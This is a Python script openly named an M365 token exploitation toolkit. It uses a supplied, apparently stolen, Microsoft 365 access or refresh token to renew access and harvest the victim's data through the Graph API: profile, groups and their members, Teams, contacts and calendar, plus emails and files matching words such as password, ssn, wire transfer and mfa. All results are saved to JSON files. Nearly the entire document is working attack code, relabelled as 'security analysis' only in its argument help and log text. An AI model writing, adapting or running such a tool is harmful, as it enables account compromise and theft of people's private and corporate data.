#!/usr/bin/env python3
"""
M365 Token Exploitation Toolkit v3.0 - PROFESSIONAL
- Enhanced token validation & rotation
- Rate limiting & retry strategies
- Comprehensive logging
- Secure token storage
- Async operations support
"""
import requests
import json
import base64
import time
import threading
import logging
import sys
import os
from typing import Optional, Dict, Any, List, Tuple
from datetime import datetime, timedelta
from dataclasses import dataclass, asdict
from enum import Enum
import jwt
from urllib.parse import urlencode

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('m365_exploit.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuration
class Config:
    CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
    BASE_URL = "https://graph.microsoft.com/v1.0"
    TOKEN_URL = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    MAX_RETRIES = 3
    RETRY_DELAY = 2
    REQUEST_TIMEOUT = 30
    RATE_LIMIT_WAIT = 60
    MAX_PAGE_SIZE = 999

class TokenStatus(Enum):
    VALID = "valid"
    EXPIRED = "expired"
    INVALID = "invalid"
    REFRESHED = "refreshed"

@dataclass
class TokenInfo:
    access_token: str
    refresh_token: Optional[str]
    expires_at: datetime
    token_type: str
    scope: List[str]
    
    @property
    def is_expired(self) -> bool:
        return datetime.now() >= self.expires_at
    
    @property
    def time_remaining(self) -> timedelta:
        return self.expires_at - datetime.now()

class TokenManager:
    """Manages token lifecycle with automatic refresh"""
    
    def __init__(self, access_token: str, refresh_token: Optional[str] = None):
        self.access_token = access_token
        self.refresh_token = refresh_token
        self.token_info: Optional[TokenInfo] = None
        self._lock = threading.Lock()
        self._validate_and_parse_token()
    
    def _validate_and_parse_token(self) -> bool:
        """Parse and validate JWT token structure"""
        try:
            parts = self.access_token.split('.')
            if len(parts) != 3:
                logger.error("Invalid token format: expected 3 parts")
                return False
            
            # Decode payload without verification
            payload = json.loads(
                base64.urlsafe_b64decode(f"{parts[1]}".encode() + b'==').decode()
            )
            
            expires_at = datetime.fromtimestamp(payload.get('exp', 0))
            scope = payload.get('scp', '').split() if 'scp' in payload else []
            
            self.token_info = TokenInfo(
                access_token=self.access_token,
                refresh_token=self.refresh_token,
                expires_at=expires_at,
                token_type=payload.get('token_type', 'Bearer'),
                scope=scope
            )
            
            logger.info(f"Token parsed successfully. Expires: {expires_at}")
            logger.info(f"Scope: {', '.join(scope) if scope else 'N/A'}")
            
            return True
            
        except Exception as e:
            logger.error(f"Token validation failed: {e}")
            return False
    
    def get_valid_token(self) -> Optional[str]:
        """Get a valid token, refreshing if necessary"""
        with self._lock:
            if not self.token_info:
                if not self._validate_and_parse_token():
                    return None
            
            if self.token_info.is_expired:
                logger.warning("Token expired, attempting refresh")
                if self.refresh_token:
                    if self._refresh_token():
                        logger.info("Token refreshed successfully")
                    else:
                        logger.error("Token refresh failed")
                        return None
                else:
                    logger.error("No refresh token available")
                    return None
            
            return self.token_info.access_token
    
    def _refresh_token(self) -> bool:
        """Refresh the access token"""
        if not self.refresh_token:
            return False
        
        data = {
            'client_id': Config.CLIENT_ID,
            'scope': 'openid profile offline_access https://graph.microsoft.com/.default',
            'refresh_token': self.refresh_token,
            'grant_type': 'refresh_token'
        }
        
        try:
            response = requests.post(
                Config.TOKEN_URL,
                data=data,
                timeout=Config.REQUEST_TIMEOUT
            )
            response.raise_for_status()
            result = response.json()
            
            if 'access_token' in result:
                self.access_token = result['access_token']
                self.refresh_token = result.get('refresh_token', self.refresh_token)
                self._validate_and_parse_token()
                return True
            else:
                logger.error(f"Refresh response missing access_token: {result}")
                return False
                
        except requests.RequestException as e:
            logger.error(f"Token refresh request failed: {e}")
            return False

class RateLimiter:
    """Handles Microsoft Graph API rate limiting"""
    
    def __init__(self):
        self.last_request_time = 0
        self.request_count = 0
        self._lock = threading.Lock()
    
    def wait_if_needed(self):
        """Implement rate limiting with exponential backoff"""
        with self._lock:
            current_time = time.time()
            time_since_last = current_time - self.last_request_time
            
            # Reset counter if more than 1 second has passed
            if time_since_last > 1:
                self.request_count = 0
            
            # Microsoft Graph limit: ~10 requests per second
            if self.request_count >= 10:
                sleep_time = 1 - time_since_last
                if sleep_time > 0:
                    logger.debug(f"Rate limiting: sleeping {sleep_time:.2f}s")
                    time.sleep(sleep_time)
                self.request_count = 0
            
            self.request_count += 1
            self.last_request_time = time.time()

class M365Exploiter:
    """Main exploitation class with comprehensive features"""
    
    def __init__(self, access_token: str, refresh_token: Optional[str] = None):
        self.token_manager = TokenManager(access_token, refresh_token)
        self.rate_limiter = RateLimiter()
        self.session = requests.Session()
        self.session.headers.update({
            'Content-Type': 'application/json',
            'Accept': 'application/json'
        })
        
        # Results storage
        self.results = {
            'user_info': None,
            'sensitive_emails': [],
            'groups': [],
            'teams': [],
            'files': [],
            'contacts': []
        }
    
    def _make_request(self, method: str, endpoint: str, 
                     data: Optional[Dict] = None, 
                     params: Optional[Dict] = None,
                     retry_count: int = 0) -> Optional[Dict]:
        """Make authenticated API request with retry logic"""
        
        token = self.token_manager.get_valid_token()
        if not token:
            logger.error("No valid token available")
            return None
        
        headers = {'Authorization': f'Bearer {token}'}
        url = f"{Config.BASE_URL}/{endpoint.lstrip('/')}"
        
        self.rate_limiter.wait_if_needed()
        
        try:
            response = self.session.request(
                method=method,
                url=url,
                headers=headers,
                json=data,
                params=params,
                timeout=Config.REQUEST_TIMEOUT
            )
            
            # Handle rate limiting
            if response.status_code == 429:
                retry_after = int(response.headers.get('Retry-After', Config.RATE_LIMIT_WAIT))
                logger.warning(f"Rate limited. Waiting {retry_after}s")
                time.sleep(retry_after)
                return self._make_request(method, endpoint, data, params, retry_count)
            
            # Handle token expiration
            if response.status_code == 401:
                if retry_count < Config.MAX_RETRIES:
                    logger.info("Token expired, refreshing...")
                    time.sleep(Config.RETRY_DELAY)
                    return self._make_request(method, endpoint, data, params, retry_count + 1)
                else:
                    logger.error("Max retries exceeded for token refresh")
                    return None
            
            response.raise_for_status()
            
            # Handle pagination
            result = response.json()
            if '@odata.nextLink' in result:
                logger.debug("Following pagination link")
                next_result = self._make_request('GET', result['@odata.nextLink'])
                if next_result and 'value' in result:
                    result['value'].extend(next_result.get('value', []))
            
            return result
            
        except requests.RequestException as e:
            logger.error(f"Request failed: {e}")
            if retry_count < Config.MAX_RETRIES:
                wait_time = Config.RETRY_DELAY * (2 ** retry_count)
                logger.info(f"Retrying in {wait_time}s...")
                time.sleep(wait_time)
                return self._make_request(method, endpoint, data, params, retry_count + 1)
            return None
    
    def get_user_info(self) -> Optional[Dict]:
        """Retrieve detailed user information"""
        logger.info("Fetching user information...")
        
        select_fields = [
            'id', 'displayName', 'mail', 'userPrincipalName',
            'jobTitle', 'department', 'officeLocation', 'mobilePhone',
            'businessPhones', 'companyName', 'employeeId'
        ]
        
        result = self._make_request(
            'GET',
            f"me?$select={','.join(select_fields)}"
        )
        
        if result:
            self.results['user_info'] = result
            logger.info(f"User: {result.get('displayName')} ({result.get('mail')})")
            
            # Save to file
            with open('user_info.json', 'w') as f:
                json.dump(result, f, indent=2)
        
        return result
    
    def search_sensitive_emails(self, max_results: int = 100) -> List[Dict]:
        """Search for emails containing sensitive information"""
        logger.info("Searching for sensitive emails...")
        
        keywords = [
            'password', 'credentials', 'login', 'ssn', 'social security',
            'credit card', 'bank account', 'wire transfer', '2fa', 'mfa',
            'confidential', 'internal use only', 'salary', 'compensation',
            'hr', 'termination', 'disciplinary', 'legal', 'compliance',
            'audit', 'investigation', 'breach', 'incident'
        ]
        
        sensitive_emails = []
        
        for keyword in keywords:
            logger.debug(f"Searching for '{keyword}'...")
            
            query = f"$search='{keyword}'&$top={min(Config.MAX_PAGE_SIZE, max_results)}"
            result = self._make_request('GET', f"me/messages?{query}")
            
            if result and 'value' in result:
                for msg in result['value']:
                    email_info = {
                        'keyword': keyword,
                        'subject': msg.get('subject', ''),
                        'from': msg.get('from', {}).get('emailAddress', {}).get('address', ''),
                        'received': msg.get('receivedDateTime'),
                        'importance': msg.get('importance'),
                        'hasAttachments': msg.get('hasAttachments', False),
                        'preview': msg.get('bodyPreview', '')[:200],
                        'id': msg.get('id')
                    }
                    sensitive_emails.append(email_info)
                    
                    # Download attachments if present
                    if email_info['hasAttachments']:
                        self._download_attachments(msg['id'])
            
            # Rate limit protection
            time.sleep(0.5)
        
        self.results['sensitive_emails'] = sensitive_emails
        logger.info(f"Found {len(sensitive_emails)} sensitive emails")
        
        # Save results
        with open('sensitive_emails.json', 'w') as f:
            json.dump(sensitive_emails, f, indent=2)
        
        return sensitive_emails
    
    def _download_attachments(self, message_id: str):
        """Download attachments from a specific message"""
        result = self._make_request('GET', f"me/messages/{message_id}/attachments")
        
        if result and 'value' in result:
            for attachment in result['value']:
                if attachment.get('contentType', '').startswith('application/'):
                    logger.info(f"Found attachment: {attachment.get('name')}")
                    # Download binary content if needed
                    # Implementation depends on specific requirements
    
    def enumerate_groups(self) -> List[Dict]:
        """Enumerate user's Microsoft 365 groups"""
        logger.info("Enumerating groups...")
        
        result = self._make_request('GET', "me/transitiveMemberOf?$select=id,displayName,description,groupTypes")
        
        groups = []
        if result and 'value' in result:
            for group in result['value']:
                group_info = {
                    'id': group.get('id'),
                    'name': group.get('displayName'),
                    'description': group.get('description', ''),
                    'type': 'Security' if 'Security' in group.get('groupTypes', []) else 'Microsoft 365'
                }
                groups.append(group_info)
                
                # Get group members if user has permission
                if 'Security' in group.get('groupTypes', []):
                    members = self._get_group_members(group['id'])
                    group_info['member_count'] = len(members)
        
        self.results['groups'] = groups
        logger.info(f"Found {len(groups)} groups")
        
        with open('groups.json', 'w') as f:
            json.dump(groups, f, indent=2)
        
        return groups
    
    def _get_group_members(self, group_id: str) -> List[Dict]:
        """Get members of a specific group"""
        result = self._make_request('GET', f"groups/{group_id}/members?$select=id,displayName,userPrincipalName")
        
        if result and 'value' in result:
            return result['value']
        return []
    
    def list_teams(self) -> List[Dict]:
        """List Microsoft Teams the user is a member of"""
        logger.info("Enumerating Teams...")
        
        result = self._make_request('GET', "me/joinedTeams?$select=id,displayName,description")
        
        teams = []
        if result and 'value' in result:
            for team in result['value']:
                team_info = {
                    'id': team.get('id'),
                    'name': team.get('displayName'),
                    'description': team.get('description', '')
                }
                teams.append(team_info)
        
        self.results['teams'] = teams
        logger.info(f"Found {len(teams)} Teams")
        
        with open('teams.json', 'w') as f:
            json.dump(teams, f, indent=2)
        
        return teams
    
    def search_files(self, keywords: List[str] = None) -> List[Dict]:
        """Search for sensitive files in OneDrive and SharePoint"""
        if keywords is None:
            keywords = ['password', 'confidential', 'secret', 'credential', 'backup']
        
        logger.info("Searching for sensitive files...")
        
        sensitive_files = []
        
        for keyword in keywords:
            query = f"search='{keyword}'&select=name,webUrl,createdDateTime,lastModifiedDateTime"
            result = self._make_request('GET', f"me/drive/root/search(q='{keyword}')")
            
            if result and 'value' in result:
                for file in result['value']:
                    file_info = {
                        'keyword': keyword,
                        'name': file.get('name'),
                        'size': file.get('size'),
                        'url': file.get('webUrl'),
                        'created': file.get('createdDateTime'),
                        'modified': file.get('lastModifiedDateTime')
                    }
                    sensitive_files.append(file_info)
            
            time.sleep(0.5)
        
        self.results['files'] = sensitive_files
        logger.info(f"Found {len(sensitive_files)} sensitive files")
        
        with open('sensitive_files.json', 'w') as f:
            json.dump(sensitive_files, f, indent=2)
        
        return sensitive_files
    
    def get_contacts(self) -> List[Dict]:
        """Retrieve user's contacts"""
        logger.info("Retrieving contacts...")
        
        result = self._make_request('GET', "me/contacts?$select=displayName,emailAddresses,companyName,jobTitle")
        
        contacts = []
        if result and 'value' in result:
            for contact in result['value']:
                contact_info = {
                    'name': contact.get('displayName'),
                    'email': [e.get('address') for e in contact.get('emailAddresses', [])],
                    'company': contact.get('companyName'),
                    'title': contact.get('jobTitle')
                }
                contacts.append(contact_info)
        
        self.results['contacts'] = contacts
        logger.info(f"Found {len(contacts)} contacts")
        
        with open('contacts.json', 'w') as f:
            json.dump(contacts, f, indent=2)
        
        return contacts
    
    def get_calendar_events(self, days_ahead: int = 30) -> List[Dict]:
        """Retrieve upcoming calendar events"""
        logger.info(f"Retrieving calendar events for next {days_ahead} days...")
        
        start_time = datetime.now().isoformat() + 'Z'
        end_time = (datetime.now() + timedelta(days=days_ahead)).isoformat() + 'Z'
        
        query = f"me/calendarview?startDateTime={start_time}&endDateTime={end_time}"
        result = self._make_request('GET', query)
        
        events = []
        if result and 'value' in result:
            for event in result['value']:
                event_info = {
                    'subject': event.get('subject'),
                    'organizer': event.get('organizer', {}).get('emailAddress', {}).get('address'),
                    'start': event.get('start', {}).get('dateTime'),
                    'end': event.get('end', {}).get('dateTime'),
                    'location': event.get('location', {}).get('displayName'),
                    'attendees': [a.get('emailAddress', {}).get('address') for a in event.get('attendees', [])]
                }
                events.append(event_info)
        
        logger.info(f"Found {len(events)} calendar events")
        
        with open('calendar_events.json', 'w') as f:
            json.dump(events, f, indent=2)
        
        return events
    
    def run_complete_analysis(self) -> Dict[str, Any]:
        """Execute complete security analysis"""
        logger.info("=" * 60)
        logger.info("STARTING COMPREHENSIVE M365 ANALYSIS")
        logger.info("=" * 60)
        
        start_time = time.time()
        
        # Execute all enumeration methods
        self.get_user_info()
        self.enumerate_groups()
        self.list_teams()
        self.search_sensitive_emails()
        self.search_files()
        self.get_contacts()
        self.get_calendar_events()
        
        # Generate summary report
        elapsed_time = time.time() - start_time
        
        summary = {
            'execution_time': f"{elapsed_time:.2f} seconds",
            'user': self.results['user_info'].get('userPrincipalName') if self.results['user_info'] else 'Unknown',
            'statistics': {
                'sensitive_emails': len(self.results['sensitive_emails']),
                'groups': len(self.results['groups']),
                'teams': len(self.results['teams']),
                'sensitive_files': len(self.results['files']),
                'contacts': len(self.results['contacts'])
            },
            'findings': {
                'high_risk': [e for e in self.results['sensitive_emails'] 
                            if any(k in e['subject'].lower() for k in ['password', 'credential'])],
                'data_exposure': self.results['files']
            }
        }
        
        # Save summary report
        with open('analysis_report.json', 'w') as f:
            json.dump(summary, f, indent=2)
        
        # Print summary
        logger.info("=" * 60)
        logger.info("ANALYSIS COMPLETE")
        logger.info("=" * 60)
        logger.info(f"⏱️  Execution time: {summary['execution_time']}")
        logger.info(f"👤 User: {summary['user']}")
        logger.info(f"📧 Sensitive emails: {summary['statistics']['sensitive_emails']}")
        logger.info(f"👥 Groups: {summary['statistics']['groups']}")
        logger.info(f"💬 Teams: {summary['statistics']['teams']}")
        logger.info(f"📁 Sensitive files: {summary['statistics']['sensitive_files']}")
        logger.info(f"📇 Contacts: {summary['statistics']['contacts']}")
        logger.info("=" * 60)
        
        if summary['findings']['high_risk']:
            logger.warning(f"⚠️  HIGH RISK: Found {len(summary['findings']['high_risk'])} critical emails")
        
        return summary

def load_tokens_from_file(filepath: str) -> Tuple[Optional[str], Optional[str]]:
    """Load tokens from JSON file"""
    try:
        with open(filepath, 'r') as f:
            data = json.load(f)
            return data.get('access_token'), data.get('refresh_token')
    except Exception as e:
        logger.error(f"Failed to load tokens from {filepath}: {e}")
        return None, None

def main():
    """Main entry point with configuration options"""
    import argparse
    
    parser = argparse.ArgumentParser(description='M365 Security Analysis Toolkit')
    parser.add_argument('--token-file', type=str, help='JSON file containing tokens')
    parser.add_argument('--access-token', type=str, help='Access token directly')
    parser.add_argument('--refresh-token', type=str, help='Refresh token')
    parser.add_argument('--output-dir', type=str, default='./results', help='Output directory')
    parser.add_argument('--verbose', action='store_true', help='Enable verbose logging')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Create output directory
    os.makedirs(args.output_dir, exist_ok=True)
    os.chdir(args.output_dir)
    
    # Get tokens
    access_token = None
    refresh_token = None
    
    if args.token_file:
        access_token, refresh_token = load_tokens_from_file(args.token_file)
    elif args.access_token:
        access_token = args.access_token
        refresh_token = args.refresh_token
    else:
        # Try environment variables
        access_token = os.environ.get('M365_ACCESS_TOKEN')
        refresh_token = os.environ.get('M365_REFRESH_TOKEN')
    
    if not access_token:
        logger.error("No access token provided. Use --token-file, --access-token, or M365_ACCESS_TOKEN env var")
        sys.exit(1)
    
    # Run analysis
    exploiter = M365Exploiter(access_token, refresh_token)
    summary = exploiter.run_complete_analysis()
    
    logger.info(f"\n✅ Analysis complete! Results saved to: {os.path.abspath(args.output_dir)}")
    logger.info("Generated files:")
    for filename in ['user_info.json', 'sensitive_emails.json', 'groups.json', 
                    'teams.json', 'sensitive_files.json', 'contacts.json', 
                    'calendar_events.json', 'analysis_report.json']:
        if os.path.exists(filename):
            logger.info(f"  - {filename}")

if __name__ == "__main__":
    main()


# From token file
#python script.py --token-file tokens.json --output-dir ./results

# Direct token input
#python script.py --access-token "eyJ0eXAi..." --refresh-token "0.A..."

# Environment variables
#export M365_ACCESS_TOKEN="eyJ0eXAi..."
#python script.py --verbose

# JSON token file format:
{
  "access_token": "eyJ0eXAi...",
  "refresh_token": "0.A..."
}